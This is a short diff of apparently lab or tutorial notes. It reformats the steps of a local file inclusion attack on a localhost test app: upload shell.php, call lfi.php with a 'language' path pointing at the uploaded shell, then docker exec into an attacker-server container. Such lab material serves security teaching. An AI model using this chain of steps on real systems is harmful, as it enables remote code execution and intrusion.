@@ -82,10 +82,9 @@ Check for uid in output
 
 #### Shell
 
-Upload shell.php
-[http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell](http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell)
-
-then:
+- Upload shell.php
+- goto: [http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell](http://127.0.0.1:8883/lfi.php?language=/var/www/html/uploads/shell)
+- then:
 
 ```
 docker exec -ti <containerid_attackerserver> /bin/bash
